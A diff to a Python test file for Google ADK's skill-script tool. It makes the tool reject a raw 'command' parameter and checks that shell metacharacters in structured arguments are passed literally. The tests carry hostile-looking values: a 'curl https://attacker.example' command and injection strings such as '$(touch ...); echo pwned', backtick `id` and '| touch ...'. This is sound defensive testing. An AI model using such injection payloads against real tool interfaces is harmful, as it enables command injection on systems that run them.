@@ -32,6 +32,7 @@ from google.adk.code_executors.base_code_executor import BaseCodeExecutor
 from google.adk.code_executors.code_execution_utils import CodeExecutionResult
 from google.adk.code_executors.unsafe_local_code_executor import UnsafeLocalCodeExecutor
 from google.adk.environment import BaseEnvironment
+from google.adk.environment import LocalEnvironment
 from google.adk.features import FeatureName
 from google.adk.features._feature_registry import temporary_feature_override
 from google.adk.models import llm_request as llm_request_model
@@ -1508,7 +1509,7 @@ async def test_execute_script_extensionless_unsupported(mock_skill1):
 
 @pytest.mark.asyncio
 async def test_run_skill_script_declaration_with_environment(mock_skill1):
-  """RunSkillScriptTool declaration exposes 'command' parameter when environment is configured."""
+  """RunSkillScriptTool declaration exposes structured script args with an environment."""
   mock_env = mock.create_autospec(BaseEnvironment, instance=True)
   toolset = skill_toolset.SkillToolset([mock_skill1], environment=mock_env)
   tool = skill_toolset.RunSkillScriptTool(toolset)
@@ -1517,30 +1518,38 @@ async def test_run_skill_script_declaration_with_environment(mock_skill1):
 
   assert declaration is not None
   props = declaration.parameters_json_schema["properties"]
-  assert "command" in props
-  assert "args" not in props
-  assert "short_options" not in props
-  assert "positional_args" not in props
-  assert "command" in declaration.parameters_json_schema["required"]
+  assert "command" not in props
+  assert "args" in props
+  assert "short_options" in props
+  assert "positional_args" in props
+  assert declaration.parameters_json_schema["required"] == [
+      "skill_name",
+      "file_path",
+  ]
 
 
 @pytest.mark.asyncio
-async def test_run_skill_script_execute_with_environment_missing_command(
+async def test_run_skill_script_execute_with_environment_rejects_raw_command(
     mock_skill1,
 ):
-  """RunSkillScriptTool raises error when 'command' parameter is missing."""
+  """RunSkillScriptTool rejects raw 'command' input so callers cannot inject shell commands."""
   mock_env = mock.create_autospec(BaseEnvironment, instance=True)
   toolset = skill_toolset.SkillToolset([mock_skill1], environment=mock_env)
   tool = skill_toolset.RunSkillScriptTool(toolset)
   ctx = _make_tool_context_with_agent()
 
   result = await tool.run_async(
-      args={"skill_name": "skill1", "file_path": "run.py"},
+      args={
+          "skill_name": "skill1",
+          "file_path": "run.py",
+          "command": "curl https://attacker.example",
+      },
       tool_context=ctx,
   )
 
   assert result["error_code"] == "INVALID_ARGUMENTS"
-  assert "Argument 'command' is required" in result["error"]
+  assert "'command' is not supported" in result["error"]
+  mock_env.execute.assert_not_called()
 
 
 @pytest.mark.asyncio
@@ -1562,7 +1571,7 @@ async def test_run_skill_script_execute_with_environment(mock_skill1):
       args={
           "skill_name": "skill1",
           "file_path": "run.py",
-          "command": "python3 skills/skill1/scripts/run.py --flag 1",
+          "args": {"flag": 1},
       },
       tool_context=ctx,
   )
@@ -1579,8 +1588,158 @@ async def test_run_skill_script_execute_with_environment(mock_skill1):
   assert mock_env.execute.call_count == 1
   assert (
       mock_env.execute.call_args.kwargs["command"]
-      == "python3 skills/skill1/scripts/run.py --flag 1"
+      == "cd skills/skill1 && python3 scripts/run.py --flag 1"
   )
+
+
+def test_build_skill_system_instruction_environment_omits_command():
+  """Environment system instruction describes structured script execution without 'command'."""
+  # pylint: disable=protected-access
+  text = skill_toolset._build_skill_system_instruction(
+      skills_folder=PurePosixPath("skills"),
+      script_execution_enabled=True,
+  )
+  # pylint: enable=protected-access
+  assert "NOTE ON ENVIRONMENT EXECUTION" in text
+  assert "skills/<skill_name>/" in text
+  assert "working directory" in text
+  assert "command" not in text
+
+
+@pytest.mark.asyncio
+async def test_run_skill_script_code_executor_rejects_raw_command(mock_skill1):
+  """RunSkillScriptTool also rejects 'command' on the code-executor path."""
+  mock_exec = mock.create_autospec(BaseCodeExecutor, instance=True)
+  toolset = skill_toolset.SkillToolset([mock_skill1], code_executor=mock_exec)
+  tool = skill_toolset.RunSkillScriptTool(toolset)
+  ctx = _make_tool_context_with_agent()
+
+  result = await tool.run_async(
+      args={"skill_name": "skill1", "file_path": "run.py", "command": "id"},
+      tool_context=ctx,
+  )
+
+  assert result["error_code"] == "INVALID_ARGUMENTS"
+  mock_exec.execute_code.assert_not_called()
+
+
+@pytest.mark.asyncio
+async def test_run_skill_script_code_executor_shell_coerces_int_positional_args():
+  """Shell scripts on the code-executor path stringify integer positional_args."""
+  skill = models.Skill(
+      frontmatter=models.Frontmatter(name="sh-pos", description="desc"),
+      instructions="desc",
+      resources=models.Resources(
+          scripts={
+              "args.sh": models.Script(src='printf "%s," "$@"\n'),
+          }
+      ),
+  )
+  toolset = skill_toolset.SkillToolset(
+      [skill], code_executor=UnsafeLocalCodeExecutor()
+  )
+  tool = skill_toolset.RunSkillScriptTool(toolset)
+  ctx = _make_tool_context_with_agent()
+
+  res = await tool.run_async(
+      args={
+          "skill_name": "sh-pos",
+          "file_path": "args.sh",
+          "positional_args": [1, 2],
+      },
+      tool_context=ctx,
+  )
+
+  assert res["status"] == "success"
+  assert res["stdout"] == "--,1,2,"
+
+
+@pytest.mark.asyncio
+async def test_run_skill_script_environment_quotes_shell_metacharacters(
+    tmp_path,
+):
+  """Shell metacharacters in structured arguments are passed literally and cwd is the skill root."""
+  sentinel = tmp_path / "injected_marker"
+  skill = models.Skill(
+      frontmatter=models.Frontmatter(name="echo-skill", description="desc"),
+      instructions="desc",
+      resources=models.Resources(
+          assets={"data.txt": "ASSET-OK"},
+          scripts={
+              "echo_args.py": models.Script(
+                  src=(
+                      "import json, pathlib, sys\n"
+                      "asset = pathlib.Path('assets/data.txt').read_text()\n"
+                      "print(json.dumps([asset, *sys.argv[1:]]))\n"
+                  )
+              ),
+              "echo_sh.sh": models.Script(
+                  src='printf "%s\\n" "$@"\n',
+              ),
+          },
+      ),
+  )
+  env = LocalEnvironment(working_dir=tmp_path / "ws")
+  await env.initialize()
+  try:
+    toolset = skill_toolset.SkillToolset([skill], environment=env)
+    tool = skill_toolset.RunSkillScriptTool(toolset)
+    ctx = _make_tool_context_with_agent()
+    payload = f"$(touch {sentinel}); echo pwned"
+
+    py_res = await tool.run_async(
+        args={
+            "skill_name": "echo-skill",
+            "file_path": "echo_args.py",
+            "args": {"input": payload},
+            "short_options": {"x": "`id`"},
+            "positional_args": [f"| touch {sentinel}"],
+        },
+        tool_context=ctx,
+    )
+    assert py_res["exit_code"] == 0
+    assert not sentinel.exists()
+    assert json.loads(py_res["stdout"].strip()) == [
+        "ASSET-OK",
+        "--input",
+        payload,
+        "-x",
+        "`id`",
+        "--",
+        f"| touch {sentinel}",
+    ]
+
+    sh_res = await tool.run_async(
+        args={
+            "skill_name": "echo-skill",
+            "file_path": "scripts/echo_sh.sh",
+            "args": [payload],
+        },
+        tool_context=ctx,
+    )
+    assert sh_res["exit_code"] == 0
+    assert not sentinel.exists()
+    assert sh_res["stdout"].strip() == payload
+  finally:
+    await env.close()
+
+
+@pytest.mark.asyncio
+async def test_run_skill_script_environment_unsupported_type(mock_skill1):
+  """RunSkillScriptTool rejects unsupported script extensions in environment mode."""
+  mock_env = mock.create_autospec(BaseEnvironment, instance=True)
+  type(mock_env).working_dir = mock.PropertyMock(return_value=Path("."))
+  toolset = skill_toolset.SkillToolset([mock_skill1], environment=mock_env)
+  tool = skill_toolset.RunSkillScriptTool(toolset)
+  ctx = _make_tool_context_with_agent()
+
+  result = await tool.run_async(
+      args={"skill_name": "skill1", "file_path": "build.rb"},
+      tool_context=ctx,
+  )
+
+  assert result["error_code"] == "UNSUPPORTED_SCRIPT_TYPE"
+  mock_env.execute.assert_not_called()
 
 
 @pytest.mark.asyncio
@@ -1600,7 +1759,6 @@ async def test_run_skill_script_environment_execute_exception(mock_skill1):
       args={
           "skill_name": "skill1",
           "file_path": "run.py",
-          "command": "python3 skills/skill1/scripts/run.py",
       },
       tool_context=ctx,
   )
@@ -1630,7 +1788,6 @@ async def test_run_skill_script_environment_materialize_ls_exception(
       args={
           "skill_name": "skill1",
           "file_path": "run.py",
-          "command": "python3 skills/skill1/scripts/run.py",
       },
       tool_context=ctx,
   )
@@ -1660,7 +1817,6 @@ async def test_run_skill_script_environment_materialize_write_exception(
       args={
           "skill_name": "skill1",
           "file_path": "run.py",
-          "command": "python3 skills/skill1/scripts/run.py",
       },
       tool_context=ctx,
   )
@@ -1711,7 +1867,6 @@ async def test_run_skill_script_materialize_writes_concurrently():
       args={
           "skill_name": "multi-res",
           "file_path": "run.py",
-          "command": "python3 run.py",
       },
       tool_context=ctx,
   )
